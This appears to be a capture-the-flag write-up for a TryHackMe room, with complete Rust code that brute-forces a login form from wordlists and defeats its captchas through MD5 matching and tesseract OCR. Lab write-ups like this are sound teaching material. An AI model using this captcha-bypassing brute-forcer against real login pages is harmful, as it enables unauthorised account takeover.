# Capture Returns

https://tryhackme.com/r/room/capturereturns, rated Hard

The key idea of this room is that it provides wordlists for usernames and passwords, and you have to brute force a login form. Except, every three fails or so the room will present a captcha, where you have to respond with one of three shapes or solve a math question. Both math and shapes are presented as an image, meaning normal HTML response parsing will not work.

The most common solution is to use some sort of OCR tool, e.g. [tesseract, a command line OCR engine on linux](https://manpages.ubuntu.com/manpages/trusty/man1/tesseract.1.html). While the different shapes presented use the same images, so getting their base64 content or calculating hashes is sufficient to work out what shape is being requested, OCR is required to read the math expressions and then come up with an answer.

For me, I did this with Rust, with the following folder structure:

```
solver
  Cargo.toml
  usernames.txt
  passwords.txt
  src/
    main.rs
```

And then run this using `cargo run` from the solver folder on the attack box. This will download the required packages from cargo.toml and then run the code. It needs to be run on linux, and tesseract must be installed (which it is on the THM attack box).

Here is Cargo.toml:

```yaml
[package]
name = "capture-returns"
version = "0.1.0"
edition = "2021"

# See more keys and their definitions at https://doc.rust-lang.org/cargo/reference/manifest.html

[dependencies]
base64 = "0.21.5"
eval = "0.4.3"
md5 = "0.7.0"
reqwest = { version = "0.11.22", features = ["blocking"] }
```

None of this needs to be altered. However in the next file, main.rs, the url of the target instance needs to be updated. Additionally, the code is left in place to use a proxy if you so desire, e.g. going through burp or a ssh proxy or similar (shouldnt be needed for the VPN, but the VPN is slow and not recommended for this brute forcing):

```rust
// should be placed in /src/main.rs as normal

use std::{collections::HashMap, process::{Command, Stdio}};
use reqwest::{blocking::Client, Proxy, redirect::Policy};
use base64::{engine::general_purpose, Engine as _};
use eval::eval;

const USERNAMES_DATA: &str = include_str!("../usernames.txt"); // these two files from the challenge should be next to Cargo.toml
const PASSWORDS_DATA: &str = include_str!("../passwords.txt");

fn main() {
    let target_ip = "10.10.56.26"; // update to target machine ip

    let usernames: Vec<&str> = USERNAMES_DATA.split_ascii_whitespace().collect();
    let passwords: Vec<&str> = PASSWORDS_DATA.split_ascii_whitespace().collect();

    //let proxy = Proxy::http("http://172.23.160.1:8080").unwrap(); // uncomment if you want to proxy to proxy - this was used to send data through burp
    let client = Client::builder()
        .pool_max_idle_per_host(0)
        .pool_idle_timeout(None)
        .redirect(Policy::none())
        .build().unwrap(); // comment out if using a proxy
        //.proxy(proxy).build().unwrap(); // uncomment if you want a proxy

    let url = format!("http://{target_ip}/login");

    for username in usernames.iter() {
        for password in passwords.iter() {
            println!("{username}:{password}");
            let mut form_data = HashMap::new();
            form_data.insert("username", username);
            form_data.insert("password", password);

            let response = client.post(&url)
                .form(&form_data)
                .send().unwrap();

            let body = response.text().unwrap();

            if body.contains("Invalid username or password") {
                continue;
            } else if body.contains("You need to successfully solve 3 captchas in a row") {
                let mut result = body.to_string();
                while result.contains("You need to successfully solve 3 captchas in a row") {
                    result = solve_capture_body(&client, &url, &result);
                }
            } else {
                println!("{body}");
                return;
            }
        }
    }

}

fn solve_capture_body(client: &Client, url: &str, body: &str) -> String {
    let image_start = body.find("data:image/png;base64,").unwrap() + 22;
    let image_end = body[image_start..].find("\">").unwrap();
    let image_base64 = &body[image_start..image_start+image_end]; // could be done with regex but bah

    let answer = 
        if body.contains("Describe the shape below") {
            let image_bytes = general_purpose::STANDARD.decode(image_base64).unwrap();
            let digest = md5::compute(image_bytes);
            let digest = format!("{:x}", digest);
            match digest.as_str() {
                "b889710920400c282aa6c665d7a0aef0" => "square".to_string(),
                "083db3907af568c3f08e516949bab93e" => "circle".to_string(),
                "8743634f70b2d273a8eaf64412c96490" => "triangle".to_string(),
                _ => {
                    println!("unknown image");
                    "".to_string()
                }
            }
        } else {
            let cmd1 = Command::new("echo")
                .arg("-n")
                .arg(image_base64)
                .stdout(Stdio::piped())
                .spawn()
                .expect("Failed to start command1");

            let cmd2 = Command::new("base64")
                .arg("-d")
                .stdin(Stdio::from(cmd1.stdout.unwrap()))
                .stdout(Stdio::piped())
                .spawn()
                .expect("Failed to start command2");

            let cmd3 = Command::new("tesseract")
                .arg("stdin")
                .arg("stdout")
                .stdin(Stdio::from(cmd2.stdout.unwrap()))
                .output()
                .expect("Failed to start command3");

            let result = String::from_utf8_lossy(&cmd3.stdout);
            let result = result.replace("?", "").replace("=", "");
            let equation = result.trim();

            let result = eval(equation).unwrap();
            format!("{result}")
        };
    
        println!("captcha_answer: {answer}");

    let mut form_data = HashMap::new();
    form_data.insert("captcha", answer);

    let response = client.post(url)
        .form(&form_data)
        .send().unwrap();

    response.text().unwrap()
}
```

I used md5 hashes to identify the images, which unnecessary but interesting to code - the alternative would be just recognising sequences of base64 in their content, or decoding some of the bytes that differed them /shrug.

This code will brute force the login form, while printing its captcha responses as necessary, and then finally if a login succeeds it will read the THM flag for you.
